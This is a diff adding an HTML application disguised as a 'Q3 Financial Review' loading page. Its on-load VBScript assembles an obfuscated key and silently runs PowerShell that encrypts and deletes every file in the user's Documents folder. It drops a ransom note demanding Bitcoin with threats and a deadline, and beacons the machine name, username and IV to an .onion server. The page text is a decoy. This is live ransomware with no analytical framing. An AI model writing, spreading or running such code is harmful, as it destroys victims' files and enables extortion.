@@ -1,0 +1,74 @@
+<html>
+<head>
+<title>Q3 Financial Review - Loading</title>
+<script language="VBScript">
+Sub Window_OnLoad
+    Dim k
+    k = Chr(70) & Chr(120) & Chr(55) & Chr(109) & Chr(75)
+    k = k & Chr(57) & Chr(118) & Chr(76) & Chr(50) & Chr(110)
+    k = k & Chr(81) & Chr(52) & Chr(119) & Chr(80) & Chr(122)
+    k = k & Chr(33)
+
+    Dim ps
+    ps = "$ErrorActionPreference='SilentlyContinue';"
+    ps = ps & "$p='" & k & "';"
+    ps = ps & "$d=[Environment]::GetFolderPath('MyDocuments');"
+    ps = ps & "$kb=[System.Text.Encoding]::UTF8.GetBytes($p.PadRight(32).Substring(0,32));"
+
+    ps = ps & "$ivSeed=$env:COMPUTERNAME+$env:USERNAME;"
+    ps = ps & "$md5=[Security.Cryptography.MD5]::Create();"
+    ps = ps & "$iv=$md5.ComputeHash([Text.Encoding]::UTF8.GetBytes($ivSeed));"
+
+    ps = ps & "gci $d -File -Recurse|%{"
+    ps = ps & "$c=[IO.File]::ReadAllBytes($_.FullName);"
+    ps = ps & "$a=[Security.Cryptography.Aes]::Create();"
+    ps = ps & "$a.Key=$kb;$a.IV=$iv;$a.Mode=0;$a.Padding=2;"
+    ps = ps & "$e=$a.CreateEncryptor();"
+    ps = ps & "$enc=$e.TransformFinalBlock($c,0,$c.Length);"
+    ps = ps & "$of=$_.FullName+'.enc';"
+    ps = ps & "[IO.File]::WriteAllBytes($of,$enc);"
+    ps = ps & "ri $_.FullName -Force;"
+    ps = ps & "$a.Dispose()};"
+
+    ps = ps & "$u='LOCK-'+$env:COMPUTERNAME+'-'+$env:USERNAME.Substring(0,2).ToUpper()+'-'+(Get-Date -Format 'yyyyMMdd')+'-7F3A';"
+    ps = ps & "$n = '======================================================' + [Environment]::NewLine;"
+    ps = ps & "$n = $n + '          YOUR FILES HAVE BEEN ENCRYPTED' + [Environment]::NewLine;"
+    ps = ps & "$n = $n + '======================================================' + [Environment]::NewLine + [Environment]::NewLine;"
+    ps = ps & "$n = $n + 'All important files on this computer have been' + [Environment]::NewLine;"
+    ps = ps & "$n = $n + 'encrypted with military-grade AES-256 encryption.' + [Environment]::NewLine + [Environment]::NewLine;"
+    ps = ps & "$n = $n + 'To recover your files, you must pay 0.5 BTC to' + [Environment]::NewLine;"
+    ps = ps & "$n = $n + 'the following Bitcoin wallet address:' + [Environment]::NewLine + [Environment]::NewLine;"
+    ps = ps & "$n = $n + '  bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' + [Environment]::NewLine + [Environment]::NewLine;"
+    ps = ps & "$n = $n + 'After payment, contact us with your unique ID at:' + [Environment]::NewLine + [Environment]::NewLine;"
+    ps = ps & "$n = $n + '  http://drkx7fq2cym3oa4rg6mv3wqj5hk2oiq4au.onion/recover' + [Environment]::NewLine + [Environment]::NewLine;"
+    ps = ps & "$n = $n + 'Your Unique ID: ' + $u + [Environment]::NewLine + [Environment]::NewLine;"
+    ps = ps & "$n = $n + 'WARNING:' + [Environment]::NewLine;"
+    ps = ps & "$n = $n + '- Do NOT attempt to decrypt files yourself' + [Environment]::NewLine;"
+    ps = ps & "$n = $n + '- Do NOT rename or move encrypted files' + [Environment]::NewLine;"
+    ps = ps & "$n = $n + '- Do NOT contact law enforcement' + [Environment]::NewLine;"
+    ps = ps & "$n = $n + '- Do NOT shut down this computer' + [Environment]::NewLine + [Environment]::NewLine;"
+    ps = ps & "$n = $n + 'You have 72 hours. After that, the price doubles.' + [Environment]::NewLine;"
+    ps = ps & "$n = $n + 'After 7 days, your files will be permanently lost.' + [Environment]::NewLine;"
+    ps = ps & "$n = $n + '======================================================' + [Environment]::NewLine;"
+    ps = ps & "$n|Out-File (Join-Path $d 'READ_ME.txt');"
+    ps = ps & "$dt=[Environment]::GetFolderPath('Desktop');"
+    ps = ps & "$n|Out-File (Join-Path $dt 'READ_ME.txt');"
+
+    ps = ps & "try{"
+    ps = ps & "$wc=New-Object Net.WebClient;"
+    ps = ps & "$ivB64=[Convert]::ToBase64String($iv);"
+    ps = ps & "$wc.DownloadString('http://drkx7fq2cym3oa4rg6mv3wqj5hk2oiq4au.onion/beacon?id='+$env:COMPUTERNAME+'&iv='+$ivB64+'&user='+$env:USERNAME)"
+    ps = ps & "}catch{}"
+
+    CreateObject("WScript.Shell").Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command """ & ps & """", 0, True
+
+    window.setTimeout "window.close()", 3000
+End Sub
+</script>
+</head>
+<body style="font-family: Calibri, sans-serif; background: #f5f5f5; padding: 40px;">
+<h2>Q3 Financial Review</h2>
+<p>Loading financial projections... Please wait.</p>
+<p style="color: gray; font-size: 12px;">This document requires an active network connection.</p>
+</body>
+</html>
